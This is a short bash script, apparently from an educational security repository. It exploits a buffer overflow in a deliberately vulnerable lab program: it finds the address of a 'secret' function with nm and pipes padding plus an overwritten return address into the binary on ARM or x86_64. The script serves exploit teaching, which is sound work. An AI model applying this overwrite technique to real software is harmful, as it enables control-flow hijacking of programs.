#!/bin/bash
# secretfunc_try2.sh
# Part of my 'hacksec' github repo:
# https://github.com/kaiwan/hacksec
# Try to run the 'secret' function via a BoF vuln!
# Kaiwan NB
PUT=./bof_vuln_reg  #./bof_vuln_lessprot

usage()
{
  echo "Usage: $0 {-a|-x}
  -a : running on ARM (Aarch32) arch
  -x : running on X86_64 arch"
}

#--- 'main'
[ $# -ne 1 ] && {
  usage
  exit 1
}
if [ "$1" = "-h" -o "$1" = "--help" ]; then
  usage
  exit 0
fi
if [ "$1" != "-a" -a "$1" != "-x" ]; then
  usage
  exit 1
fi

[ "$1" = "-x" ] && PUT=./bof_vuln_lessprot
 # Notice! on x86_64, the 'regular' program is caught via
 # '*** stack smashing detected ***'
 # so we instead use the less protected ver here... :-p
[ ! -f ${PUT} ] && {
  echo "$0: program-under-test ${PUT} not present... build?"
  exit 1
}

# Find &secret_func
# $ nm ./bof_vuln |grep secret
# 000104c4 t secret_func
## 0000067c t secret_func

addr=$(nm ${PUT} |grep -w secret_func|awk '{print $1}')
[ -z "${addr}" ] && {
  echo "$0: couldn't get secret func address (??) aborting..."
  exit 1
}
echo "$0: addr of secret_func() is ${addr}"

#--- NOTE
# Update the address below for your system binary

if [ "$1" = "-a" ]; then
  #0x000104c4 (on RPi0W)
  perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ${PUT}
elif [ "$1" = "-x" ]; then
  #0x00000000000011e9 (on x86_64)
  perl -e 'print "A"x12 . "B"x4 . "\xe9\x11\x00\x00"' | ${PUT}
fi
